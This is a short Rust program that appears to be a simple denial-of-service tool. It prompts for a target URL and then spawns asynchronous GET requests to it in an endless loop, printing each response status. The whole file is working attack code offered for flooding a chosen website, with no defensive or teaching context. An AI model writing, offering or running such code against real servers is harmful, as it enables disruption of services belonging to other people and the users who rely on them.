use reqwest::Response;

static mut ATTACK_URL: String = String::new();

pub async fn start() {
    where_to_attack();
    core_attack();
}
async fn request(url: &str) -> Result<Response, reqwest::Error> {
    let output = reqwest::Client::new().get(url).send().await;
    return match output {
        Ok(data) => Ok(data),
        Err(err) => Err(err),
    };
}

fn core_attack() {
    loop {
        tokio::spawn(async {
            unsafe {
                let error_data = request(&ATTACK_URL).await;
                match error_data {
                    Ok(data) => {
                        println!("Status Code Recived is {}", data.status())
                    }
                    Err(data) => {
                        println!("OH NO BAD Status Code Recived is {}", data.to_string())
                    }
                }
            }
        });
    }
}

fn where_to_attack() {
    println!("What Url to attack?");
    let mut line = String::new();
    let _ = std::io::stdin().read_line(&mut line).unwrap();
    unsafe {
        ATTACK_URL = line;
    }
}
